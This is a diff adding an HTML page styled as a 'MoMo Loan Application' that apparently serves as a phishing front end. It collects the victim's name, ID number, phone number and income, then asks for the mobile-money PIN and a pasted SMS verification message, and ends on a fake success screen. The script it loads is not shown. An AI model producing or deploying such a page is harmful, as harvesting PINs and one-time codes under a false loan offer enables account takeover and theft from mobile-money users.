@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MoMo Loan Application Form</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Step 1: Loan Application Form -->
+        <div id="step1" class="step active">
+            <div class="form-header">
+                <h1>MoMo Loan Application</h1>
+                <p>Fill in your details to apply for a loan</p>
+            </div>
+            <form id="loanForm">
+                <div class="form-group">
+                    <label for="fullName">Full Name *</label>
+                    <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="email">Email Address *</label>
+                    <input type="email" id="email" name="email" placeholder="Enter your email address" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone">Phone Number (MoMo) *</label>
+                    <input type="tel" id="phone" name="phone" placeholder="Enter your MoMo phone number" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="idNumber">ID Number *</label>
+                    <input type="text" id="idNumber" name="idNumber" placeholder="Enter your ID number" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="loanAmount">Loan Amount (USD) *</label>
+                    <input type="number" id="loanAmount" name="loanAmount" placeholder="Enter desired loan amount" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="loanPurpose">Loan Purpose *</label>
+                    <select id="loanPurpose" name="loanPurpose" required>
+                        <option value="">Select loan purpose</option>
+                        <option value="personal">Personal Use</option>
+                        <option value="business">Business</option>
+                        <option value="education">Education</option>
+                        <option value="medical">Medical</option>
+                        <option value="other">Other</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="employment">Employment Status *</label>
+                    <select id="employment" name="employment" required>
+                        <option value="">Select employment status</option>
+                        <option value="employed">Employed</option>
+                        <option value="self-employed">Self-Employed</option>
+                        <option value="unemployed">Unemployed</option>
+                        <option value="student">Student</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="monthlyIncome">Monthly Income (USD) *</label>
+                    <input type="number" id="monthlyIncome" name="monthlyIncome" placeholder="Enter your monthly income" required>
+                </div>
+
+                <button type="submit" class="btn btn-primary">Proceed to Verification</button>
+            </form>
+        </div>
+
+        <!-- Step 2: PIN Verification -->
+        <div id="step2" class="step">
+            <div class="form-header">
+                <h1>PIN Verification</h1>
+                <p>Enter the PIN sent to your MoMo account</p>
+            </div>
+            <form id="pinForm">
+                <div class="form-group">
+                    <label for="pin">Enter PIN *</label>
+                    <input type="password" id="pin" name="pin" placeholder="•••••" maxlength="5" required>
+                    <small>A 5-digit PIN has been sent to your MoMo account</small>
+                </div>
+                <div id="pinError" class="error-message" style="display:none;"></div>
+                <button type="submit" class="btn btn-primary">Verify PIN</button>
+                <button type="button" class="btn btn-secondary" onclick="goBackToStep1()">Back</button>
+            </form>
+        </div>
+
+        <!-- Step 3: SMS Code Verification -->
+        <div id="step3" class="step">
+            <div class="form-header">
+                <h1>SMS Code Verification</h1>
+                <p>Complete your verification</p>
+            </div>
+            <form id="smsForm">
+                <div class="form-group">
+                    <label for="smsCode">Copy and paste here the message you received in your SMS *</label>
+                    <textarea id="smsCode" name="smsCode" placeholder="Paste your SMS message here" rows="4" required></textarea>
+                </div>
+                <div id="smsError" class="error-message" style="display:none;"></div>
+                <button type="submit" class="btn btn-primary">Submit Verification</button>
+                <button type="button" class="btn btn-secondary" onclick="goBackToStep2()">Back</button>
+            </form>
+        </div>
+
+        <!-- Step 4: Success Message -->
+        <div id="step4" class="step">
+            <div class="success-container">
+                <div class="success-icon">✓</div>
+                <h1>Application Submitted Successfully!</h1>
+                <p>Your loan application has been received and verified.</p>
+                <p class="reference-id">Reference ID: <span id="refId"></span></p>
+                <p class="info-text">You will receive updates via SMS and email. Please allow 24-48 hours for processing.</p>
+                <button type="button" class="btn btn-primary" onclick="resetForm()">Submit Another Application</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
